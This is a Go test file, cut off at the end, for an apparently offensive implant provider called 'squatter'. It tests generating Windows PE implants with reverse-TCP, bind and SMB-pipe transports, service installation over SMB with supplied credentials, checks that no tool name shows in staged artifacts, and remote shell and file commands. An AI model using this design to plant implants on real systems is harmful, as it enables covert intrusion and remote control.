package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf16"

	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/shell"
	"github.com/Vibe-Pwners/hovel/payloads/squatter/client/wire"
	"github.com/Vibe-Pwners/hovel/sdk/go/hovel"
	"github.com/Vibe-Pwners/hovel/sdk/go/hoveltest"
)

func TestProviderReportsSquatterPayloads(t *testing.T) {
	provider := newProvider()
	if info := provider.Info(); info.Type != hovel.TypePayloadProvider {
		t.Fatalf("module type = %q", info.Type)
	}

	payloads, err := provider.ListPayloads(hovel.PayloadQuery{})
	if err != nil {
		t.Fatal(err)
	}
	if len(payloads) != 3 {
		t.Fatalf("payload count = %d", len(payloads))
	}
	for _, payload := range payloads {
		if payload.Platform != "windows" || payload.Arch != "x86" || payload.MinOS != "windows-7" {
			t.Fatalf("unexpected payload platform metadata: %#v", payload)
		}
		if len(payload.Formats) != 1 || payload.Formats[0] != "pe-exe" {
			t.Fatalf("unexpected payload formats: %#v", payload.Formats)
		}
		if payload.Session.Owner != "payload_provider" {
			t.Fatalf("unexpected session owner: %#v", payload.Session)
		}
	}
}

func TestProviderReportsStepContracts(t *testing.T) {
	contracts, err := newProvider().DescribeSteps()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]hovel.StepContract{}
	for _, step := range contracts.Steps {
		byID[step.ID] = step
	}
	for _, id := range []string{
		"squatter.generate",
		"squatter.install_smb",
		"squatter.connect_smb",
		"squatter.connect_tcp_bind",
		"squatter.listen_tcp_callback",
		"squatter.connect_tcp_callback",
	} {
		if _, ok := byID[id]; !ok {
			t.Fatalf("missing step contract %s in %#v", id, contracts.Steps)
		}
	}
	for _, id := range []string{"squatter.install_tcp_bind", "squatter.install_tcp_callback"} {
		if _, ok := byID[id]; ok {
			t.Fatalf("step contract %s is advertised but has no execution implementation", id)
		}
	}

	connect := byID["squatter.connect_smb"]
	if connect.Kind != "session.connector" {
		t.Fatalf("connect_smb kind = %q", connect.Kind)
	}
	if len(connect.Requires) != 2 {
		t.Fatalf("connect_smb requires = %#v", connect.Requires)
	}
	if connect.Requires[0].Type != hovel.CapabilityPayloadInstance || connect.Requires[0].Attributes["transport"] != smbNamedPipe {
		t.Fatalf("payload instance requirement = %#v", connect.Requires[0])
	}
	if len(connect.Produces) != 1 || connect.Produces[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("connect_smb produces = %#v", connect.Produces)
	}

	install := byID["squatter.install_smb"]
	if got := install.Prepare.Materializes; len(got) != 3 || got[0] != "staged_path" || got[1] != "service_name" || got[2] != "pipe_name" {
		t.Fatalf("install_smb materializes = %#v", got)
	}
}

func TestProviderExecuteGenerateProducesPayloadArtifactCapability(t *testing.T) {
	result, err := newProvider().ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.generate",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "192.0.2.20",
				"payload.transport": tcpBind,
				"payload.format":    formatPEEXE,
				"payload.bind_port": "9100",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("result = %#v", result)
	}
	if len(result.Capabilities) != 1 || result.Capabilities[0].Type != hovel.CapabilityPayloadArtifact {
		t.Fatalf("capabilities = %#v, want payload artifact", result.Capabilities)
	}
	capability := result.Capabilities[0]
	if capability.State != "built" || capability.Attributes["provider"] != payloadName || capability.Attributes["transport"] != tcpBind {
		t.Fatalf("artifact capability = %#v", capability)
	}
	if capability.Attributes["sha256"] == "" || capability.Attributes["size"] == int64(0) {
		t.Fatalf("artifact metadata = %#v", capability.Attributes)
	}
}

func TestProviderPrepareSMBInstallMaterializesNeutralValues(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, key := range []string{"staged_path", "service_name", "pipe_name"} {
		value, ok := prepared.PreparedValues[key]
		if !ok {
			t.Fatalf("missing prepared value %s in %#v", key, prepared.PreparedValues)
		}
		text, ok := value.Value.(string)
		if !ok || text == "" {
			t.Fatalf("prepared value %s = %#v, want string", key, value.Value)
		}
		if strings.Contains(strings.ToLower(text), "hovel") || strings.Contains(strings.ToLower(text), "squatter") {
			t.Fatalf("prepared value %s contains tool marker: %q", key, text)
		}
	}
	stagedPath := prepared.PreparedValues["staged_path"].Value.(string)
	if !strings.HasPrefix(stagedPath, `C:\Windows\Temp\`) || !strings.HasSuffix(stagedPath, ".exe") {
		t.Fatalf("staged path = %q", stagedPath)
	}
	if len(prepared.PlannedOutputs) != 3 {
		t.Fatalf("planned outputs = %#v, want payload instance, endpoint, cleanup", prepared.PlannedOutputs)
	}
	if prepared.PlannedOutputs[0].Type != hovel.CapabilityPayloadInstance || prepared.PlannedOutputs[0].State != "planned" {
		t.Fatalf("payload instance = %#v", prepared.PlannedOutputs[0])
	}
	if prepared.PlannedOutputs[1].Type != hovel.CapabilityTransport || prepared.PlannedOutputs[1].Attributes["kind"] != "smb-pipe" {
		t.Fatalf("transport endpoint = %#v", prepared.PlannedOutputs[1])
	}
	if prepared.PlannedOutputs[2].Type != hovel.CapabilityCleanupHandle {
		t.Fatalf("cleanup handle = %#v", prepared.PlannedOutputs[2])
	}
}

func TestProviderPreparePreservesExistingPreparedValues(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		ExistingPreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: `C:\Windows\Temp\abc123.exe`, Editable: true},
			"service_name": {Value: "svc123", Editable: true},
			"pipe_name":    {Value: "pipe123", Editable: true},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["staged_path"].Value; got != `C:\Windows\Temp\abc123.exe` {
		t.Fatalf("staged_path = %#v", got)
	}
	if got := prepared.PreparedValues["service_name"].Value; got != "svc123" {
		t.Fatalf("service_name = %#v", got)
	}
	if got := prepared.PreparedValues["pipe_name"].Value; got != "pipe123" {
		t.Fatalf("pipe_name = %#v", got)
	}
}

func TestProviderPrepareSMBInstallUsesConfiguredPipe(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		Config: map[string]any{
			"payload.pipe": `\\.\pipe\squatter`,
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["pipe_name"].Value; got != "squatter" {
		t.Fatalf("pipe_name = %#v, want squatter", got)
	}
	if got := prepared.PlannedOutputs[1].Attributes["pipe_name"]; got != "squatter" {
		t.Fatalf("transport pipe_name = %#v, want squatter", got)
	}
}

func TestProviderPrepareSMBInstallUsesConfiguredRemotePath(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		Config: map[string]any{
			"payload.remote_path": `C:\Windows\System32\hovel.exe`,
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["staged_path"].Value; got != `C:\Windows\System32\hovel.exe` {
		t.Fatalf("staged_path = %#v", got)
	}
	if got := prepared.PlannedOutputs[0].Attributes["staged_path"]; got != `C:\Windows\System32\hovel.exe` {
		t.Fatalf("planned staged_path = %#v", got)
	}
}

func TestProviderGeneratesWindowsPEArtifactSet(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Format:    "pe-exe",
	})
	if err != nil {
		t.Fatal(err)
	}
	if generated.Primary.Role != "primary" || generated.Primary.Encoding != "base64" {
		t.Fatalf("primary artifact = %#v", generated.Primary)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	if len(body) < 2 || string(body[:2]) != "MZ" {
		t.Fatalf("generated payload is not a PE image: %x", body[:2])
	}
	if !bytes.Contains(body, []byte("SQUAT001")) || !bytes.Contains(body, []byte("SQCFG001")) {
		t.Fatal("generated payload is missing squatter metadata markers")
	}
	if len(generated.Artifacts) != 1 {
		t.Fatalf("artifact count = %d", len(generated.Artifacts))
	}

	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindReverseTCP {
		t.Fatalf("transport kind = %d", got)
	}
	if got := body[configOffset+payloadConfigHostOffset : configOffset+payloadConfigHostOffset+4]; !bytes.Equal(got, []byte{127, 0, 0, 1}) {
		t.Fatalf("reverse host = %v", got)
	}
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 4444 {
		t.Fatalf("reverse port = %d", got)
	}
}

func TestProviderPatchesPayloadConfigFromListener(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback, "payload.lhost": "10.1.2.3", "payload.lport": "1"},
		Listener:  &hovel.ListenerRef{Host: "127.0.0.1", Port: 31337},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 31337 {
		t.Fatalf("reverse port = %d", got)
	}
}

func TestProviderPatchesTCPBindPayloadConfig(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": tcpBind, "payload.bind_port": "19100"},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindTCPBind {
		t.Fatalf("transport kind = %d", got)
	}
	if got := binary.LittleEndian.Uint16(body[configOffset+payloadConfigPortOffset:]); got != 19100 {
		t.Fatalf("bind port = %d", got)
	}
}

func TestProviderPatchesSMBNamedPipePayloadConfig(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Format:    "pe-exe",
		Config:    map[string]string{"payload.transport": smbNamedPipe, "payload.pipe": "hovel-squatter-target-1"},
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindSMBPipe {
		t.Fatalf("transport kind = %d", got)
	}
	if !bytes.Contains(body[configOffset:], []byte{'h', 0, 'o', 0, 'v', 0, 'e', 0, 'l', 0}) {
		t.Fatal("patched payload does not contain UTF-16LE pipe name")
	}
}

func TestPayloadConfigOffsetSkipsNonConfigMarker(t *testing.T) {
	body := make([]byte, 512)
	copy(body, []byte("SQCFG001-not-the-runtime-config"))
	configOffset := 128
	copy(body[configOffset:], []byte(payloadConfigMagic))
	binary.LittleEndian.PutUint32(body[configOffset+payloadConfigKindOffset:], payloadConfigKindSMBPipe)
	writeUTF16At(body, configOffset+payloadConfigPipeOffset, `\\.\pipe\squatter`)

	offset, err := payloadConfigOffset(body)
	if err != nil {
		t.Fatal(err)
	}
	if offset != configOffset {
		t.Fatalf("config offset = %d, want %d", offset, configOffset)
	}
}

func TestProviderNormalizesRemoteSMBPipePathForPayload(t *testing.T) {
	got := normalizeNamedPipe(`\\target-1\pipe\hovel-squatter-target-1`)
	if want := `\\.\pipe\hovel-squatter-target-1`; got != want {
		t.Fatalf("pipe = %q, want %q", got, want)
	}
}

func TestProviderSatisfiesPayloadProviderRPCContract(t *testing.T) {
	hoveltest.AssertPayloadProviderContract(t, newProvider(), hoveltest.PayloadProviderContract{
		Query: hovel.PayloadQuery{
			Transport: tcpCallback,
			Format:    formatPEEXE,
		},
		Target:        "target-1",
		RunID:         "run-1",
		Config:        map[string]string{"payload.transport": reverseTCP, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
		WantFormat:    formatPEEXE,
		WantTransport: tcpCallback,
		WantCapabilities: []string{
			"host.info",
			"file.get",
			"file.put",
			"file.stat",
			"file.hash",
			"registry.query",
			"eventlog.query",
			"drive.list",
			"share.list",
			"acl.stat",
			"process.exec",
			"process.exec.as_user",
			"process.run",
			"process.list",
			"process.tasklist",
			"process.kill",
			"payload.status",
			"payload.cleanup",
		},
	})
}

func TestProviderPayloadCommandCatalogueIsTruthful(t *testing.T) {
	commands, err := newProvider().ListPayloadCommands(hovel.PayloadCommandListRequest{})
	if err != nil {
		t.Fatal(err)
	}
	byName := map[string]hovel.PayloadCommand{}
	for _, command := range commands {
		byName[command.Name] = command
		for _, capability := range command.Capabilities {
			if capability == "library.rundll" {
				t.Fatalf("unsafe unimplemented capability advertised by %s", command.Name)
			}
		}
	}
	for _, name := range []string{
		"wininfo",
		"process.list",
		"process.run",
		"process.run_as_user",
		"process.kill",
		"payload.status",
		"payload.cleanup",
		"file.stat",
		"registry.query",
		"eventlog.query",
		"drive.list",
		"share.list",
		"acl.stat",
		"getfile",
		"putfile",
		"cmd",
	} {
		if _, ok := byName[name]; !ok {
			t.Fatalf("payload command %s not advertised in %#v", name, commands)
		}
	}
	if !byName["wininfo"].ReadOnly || !byName["process.list"].ReadOnly || !byName["payload.status"].ReadOnly {
		t.Fatalf("read-only commands misclassified: %#v", byName)
	}
	if !byName["process.run"].Destructive || !byName["process.run_as_user"].Destructive || !byName["process.kill"].Destructive || !byName["payload.cleanup"].Destructive {
		t.Fatalf("destructive commands misclassified: %#v", byName)
	}
	if !slicesContain(byName["process.list"].Capabilities, "process.tasklist") {
		t.Fatalf("process.list capabilities = %#v, want process.tasklist alias", byName["process.list"].Capabilities)
	}
	if !slicesContain(byName["process.run_as_user"].Capabilities, "process.exec.as_user") {
		t.Fatalf("process.run_as_user capabilities = %#v, want process.exec.as_user", byName["process.run_as_user"].Capabilities)
	}
}

func TestRunProcessRunCommandParsesTypedResult(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	done := make(chan error, 1)
	go func() {
		kind, streamID, payload, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen || streamID != 1 || !bytes.Contains(payload, []byte("process.run")) {
			done <- fmt.Errorf("open frame kind=%d stream=%d payload=%q", kind, streamID, payload)
			return
		}
		body := []byte(`{"command":"hostname","pid":42,"exitCode":0,"timedOut":false,"stdout":"host\r\n","stderr":""}`)
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, body); err != nil {
			done <- err
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindControl, 1, wire.EncodeStreamEvent(wire.StreamEvent{Kind: wire.EventExited, Code: 0})); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, 1, nil)
	}()

	result, err := runProcessRunCommand(clientConn, bufio.NewReader(clientConn), 1, hovel.PayloadCommandRequest{
		Command: "process.run",
		Args:    []string{"hostname", "1000"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if result.Stdout != "host\r\n" || result.Stderr != "" || result.Fields["pid"] != "42" || result.Fields["exitCode"] != "0" {
		t.Fatalf("process.run result = %#v", result)
	}
}

func TestRunProcessRunAsUserCommandParsesTypedResult(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	done := make(chan error, 1)
	go func() {
		kind, streamID, payload, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen || streamID != 1 || !bytes.Contains(payload, []byte("process.run_as_user")) {
			done <- fmt.Errorf("open frame kind=%d stream=%d payload=%q", kind, streamID, payload)
			return
		}
		body := []byte(`{"pid":43,"sourcePid":1364,"sessionId":0,"command":"C:\\WINDOWS\\explorer.exe","cwd":"C:\\WINDOWS","usedEnvironment":true}`)
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, body); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, 1, nil)
	}()

	result, err := runPayloadCommandOnTransport(clientConn, bufio.NewReader(clientConn), 1, hovel.PayloadCommandRequest{
		Command: "process.run_as_user",
		Args:    []string{`C:\WINDOWS\explorer.exe`, `C:\WINDOWS`, "1364"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if result.Summary != "process launched as interactive user" || result.Fields["pid"] != "43" || result.Fields["sourcePid"] != "1364" || result.Fields["sessionId"] != "0" {
		t.Fatalf("process.run_as_user result = %#v", result)
	}
}

func slicesContain(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func TestRunGetfileCommandReturnsBinaryFileArtifact(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	want := []byte{0x4d, 0x5a, 0x00, 0xff, 0xfe, 0x80}
	done := make(chan error, 1)
	go func() {
		kind, streamID, _, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen || streamID != 1 {
			done <- fmt.Errorf("open frame kind=%d stream=%d", kind, streamID)
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, append([]byte{'S'}, []byte("OK 6")...)); err != nil {
			done <- err
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, append([]byte{'D'}, want...)); err != nil {
			done <- err
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, 1, []byte{'E'}); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, 1, nil)
	}()

	result, err := runGetfileCommand(clientConn, bufio.NewReader(clientConn), 1, hovel.PayloadCommandRequest{Args: []string{`C:\Temp\payload.exe`}})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if len(result.Artifacts) != 1 || result.Artifacts[0].Data != "" || result.Artifacts[0].Path == "" {
		t.Fatalf("artifact = %#v, want file artifact without inline data", result.Artifacts)
	}
	t.Cleanup(func() {
		if err := os.Remove(result.Artifacts[0].Path); err != nil {
			t.Logf("remove materialized artifact: %v", err)
		}
	})
	got, err := os.ReadFile(result.Artifacts[0].Path)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, want) {
		t.Fatalf("artifact bytes = %x, want %x", got, want)
	}
}

func TestSquatterSessionRunsPayloadCommandOnExistingConnection(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "client connection", clientConn)
	defer closeTestConn(t, "server connection", serverConn)

	session := &squatterSession{client: shell.New(clientConn)}
	done := make(chan error, 1)
	go func() {
		kind, streamID, payload, err := wire.ReadFrame(serverConn)
		if err != nil {
			done <- err
			return
		}
		if kind != wire.KindOpen {
			done <- fmt.Errorf("frame kind=%d, want open", kind)
			return
		}
		if streamID == 0 {
			done <- fmt.Errorf("stream ID must be non-zero")
			return
		}
		if !bytes.Contains(payload, []byte("process.list")) {
			done <- fmt.Errorf("open payload %x does not contain process.list", payload)
			return
		}
		if err := wire.WriteFrame(serverConn, wire.KindData, streamID, []byte("[]")); err != nil {
			done <- err
			return
		}
		done <- wire.WriteFrame(serverConn, wire.KindClose, streamID, nil)
	}()

	result, err := session.RunPayloadCommand(hovel.PayloadCommandRequest{Command: "process.list"})
	if err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if result.Command != "process.list" || result.Stdout != "[]" {
		t.Fatalf("result = %#v, want process.list output", result)
	}
}

func TestPlaceholderLPReverseTCPPreparesListener(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	listener, err := provider.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()
	if listener.Transport != "squatter/tcp-callback" || listener.Host != "127.0.0.1" || listener.Port == 0 {
		t.Fatalf("listener = %#v", listener)
	}
	if _, ok := lp.listener("target-1"); !ok {
		t.Fatal("listener was not recorded in placeholder LP")
	}
}

func TestPlaceholderLPReverseTCPAcceptsCallback(t *testing.T) {
	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	listener, err := provider.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback, "payload.lhost": "127.0.0.1", "payload.lport": "0"},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()

	conn, err := net.Dial("tcp", net.JoinHostPort(listener.Host, strconv.Itoa(listener.Port)))
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestConn(t, "connection", conn)
	if _, err := conn.Write([]byte{'S', 'Q', 'U', 'A', 'T', 'T', 'E', 'R', 0x01, 0x00, 0x00, 0x00}); err != nil {
		t.Fatal(err)
	}

	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/tcp-callback/pe-exe",
		Config:    map[string]string{"payload.transport": tcpCallback},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.Transport != "squatter/tcp-callback" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
}

func TestPlaceholderLPTCPBindConnectsProviderOwnedSession(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	accepted := make(chan net.Conn, 1)
	go func() {
		conn, err := listener.Accept()
		if err == nil {
			accepted <- conn
		}
	}()

	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	port := listener.Addr().(*net.TCPAddr).Port
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "127.0.0.1",
		PayloadID: "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Config: map[string]string{
			"payload.transport": tcpBind,
			"payload.bind_port": strconv.Itoa(port),
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "127.0.0.1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()
	if session.Transport != "squatter/tcp-bind" || session.Kind != "agent" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	select {
	case conn := <-accepted:
		closeTestConn(t, "accepted connection", conn)
	case <-time.After(time.Second):
		t.Fatal("bind listener did not receive provider connection")
	}
}

func TestPlaceholderLPTCPBindReconnectUsesProviderRecord(t *testing.T) {
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	accepted := make(chan net.Conn, 1)
	go func() {
		conn, err := listener.Accept()
		if err == nil {
			accepted <- conn
		}
	}()

	lp := newPlaceholderLP()
	provider := Provider{lp: lp}
	port := listener.Addr().(*net.TCPAddr).Port
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:              "run-1",
		InstalledPayloadID: "p1",
		PayloadID:          "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Reconnect: &hovel.PayloadProviderRecord{
			ProviderID:    payloadName,
			Schema:        "squatter.tcp_bind.reconnect",
			SchemaVersion: "v1",
			Descriptor:    map[string]any{"transport": tcpBind, "host": "127.0.0.1", "port": float64(port)},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if _, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "127.0.0.1", Reason: "test"}); err != nil {
			t.Logf("cleanup payload: %v", err)
		}
	}()
	if session.InstalledPayloadID != "p1" || session.Transport != "squatter/tcp-bind" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	select {
	case conn := <-accepted:
		closeTestConn(t, "accepted connection", conn)
	case <-time.After(time.Second):
		t.Fatal("bind listener did not receive provider connection")
	}
}

func TestPlaceholderLPSMBConnectsProviderOwnedSession(t *testing.T) {
	connector := &fakeSMBConnector{conn: noopReadWriteCloser{}}
	lp := newPlaceholderLP()
	lp.smb = connector
	provider := Provider{lp: lp}
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     "run-1",
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Config: map[string]string{
			"payload.transport": smbNamedPipe,
			"payload.pipe":      "pipe123",
			"smb.username":      "user123",
			"smb.password":      "pass123",
			"smb.domain":        "LAB",
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.Transport != "squatter/smb-named-pipe" || session.Kind != "agent" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	if len(connector.requests) != 1 {
		t.Fatalf("smb connector requests = %#v, want one", connector.requests)
	}
	request := connector.requests[0]
	if request.Host != "target-1" || request.Pipe != "pipe123" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
		t.Fatalf("smb connector request = %#v", request)
	}
	if _, ok := lp.session("target-1"); !ok {
		t.Fatal("session was not recorded in placeholder LP")
	}
	cleanup, err := provider.CleanupPayload(hovel.CleanupPayloadRequest{Target: "target-1", Reason: "test"})
	if err != nil {
		t.Fatal(err)
	}
	if cleanup.Status != "ok" {
		t.Fatalf("cleanup = %#v", cleanup)
	}
	if _, ok := lp.session("target-1"); ok {
		t.Fatal("session was not removed during cleanup")
	}
}

func TestPlaceholderLPSMBReconnectUsesProviderRecord(t *testing.T) {
	connector := &fakeSMBConnector{conn: noopReadWriteCloser{}}
	lp := newPlaceholderLP()
	lp.smb = connector
	provider := Provider{lp: lp}
	session, err := provider.ConnectSession(hovel.ConnectSessionRequest{
		RunID:              "run-1",
		InstalledPayloadID: "p1",
		PayloadID:          "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Reconnect: &hovel.PayloadProviderRecord{
			ProviderID:    payloadName,
			Schema:        "squatter.smb_named_pipe.reconnect",
			SchemaVersion: "v1",
			Descriptor: map[string]any{
				"transport":    smbNamedPipe,
				"target.host":  "target-1",
				"payload.pipe": "pipe123",
				"smb.username": "user123",
				"smb.password": "pass123",
				"smb.domain":   "LAB",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if session.InstalledPayloadID != "p1" || session.Transport != "squatter/smb-named-pipe" || session.State != "open" {
		t.Fatalf("session = %#v", session)
	}
	if len(connector.requests) != 1 {
		t.Fatalf("smb connector requests = %#v, want one", connector.requests)
	}
	request := connector.requests[0]
	if request.Host != "target-1" || request.Pipe != "pipe123" || request.Username != "user123" || request.Password != "pass123" || request.Domain != "LAB" {
		t.Fatalf("smb connector request = %#v", request)
	}
}

func TestProviderRunOpensPrettyPTYSessionOverJSONRPC(t *testing.T) {
	clientConn, serverConn := net.Pipe()
	defer closeTestConn(t, "server connection", serverConn)

	lp := newPlaceholderLP()
	lp.smb = &fakeSMBConnector{conn: clientConn}
	rpc := hoveltest.NewRPCConn(t, Provider{lp: lp})
	defer rpc.Close()

	var result struct {
		Status   string             `json:"status"`
		Sessions []hovel.SessionRef `json:"sessions"`
	}
	rpc.Call("execute", map[string]any{
		"runId":    "run-1",
		"moduleId": "squatter",
		"target":   "target-1",
		"chainConfig": map[string]any{
			"payload.transport": smbNamedPipe,
			"payload.pipe":      "pipe123",
			"smb.username":      "user123",
			"smb.password":      "pass123",
		},
		"targetConfig": map[string]any{
			"target.host": "target-1",
		},
	}, &result)
	if result.Status != "succeeded" || len(result.Sessions) != 1 {
		t.Fatalf("execute result = %#v", result)
	}
	sessionID := result.Sessions[0].ID
	banner := readRPCSessionUntil(t, rpc, sessionID, "sq>", 2*time.Second)
	if !strings.Contains(banner, "squatterctl") || !strings.Contains(banner, "tab completes commands") {
		t.Fatalf("session banner = %q, want pretty squatterctl banner and prompt", banner)
	}

	writeRPCSession(t, rpc, sessionID, "help\n")
	help := readRPCSessionUntil(t, rpc, sessionID, "putfile", 2*time.Second)
	if !strings.Contains(help, "commands") || !strings.Contains(help, "putfile") {
		t.Fatalf("help output = %q, want squatterctl help", help)
	}

	writeRPCSession(t, rpc, sessionID, "\t")
	completion := readRPCSessionUntil(t, rpc, sessionID, "open cmd.exe", 2*time.Second)
	if !strings.Contains(completion, "cmd") || !strings.Contains(completion, "echo") {
